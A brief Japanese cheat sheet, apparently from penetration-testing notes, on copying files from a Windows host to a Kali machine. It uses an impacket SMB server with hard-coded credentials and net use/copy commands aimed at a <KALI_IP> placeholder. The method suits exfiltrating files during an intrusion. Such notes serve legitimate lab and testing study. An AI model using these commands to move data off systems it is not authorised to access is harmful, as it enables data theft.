# WindowsからKaliへファイルを送る

## impacket-smbserver

SMBをKali側で立ち上げて、Winでcopyする。

@kali
```
impacket-smbserver shared . -smb2support -username user -password pass
```
ID : user  
PW : pass  
でログイン可能なSMBサーバを立ち上げる。

共有は shared としている。コピーしたファイルはカレントディレクトリに設置される。

Windowns(PowerShell)から、

```
net use \\<KALI_IP>\shared /USER:user pass
```
でログイン可能か確認できる。

確認できたら、Windows側から
```
copy <COPY_FILENAME> \\<KALI_IP>\shared
```
でコピーする。



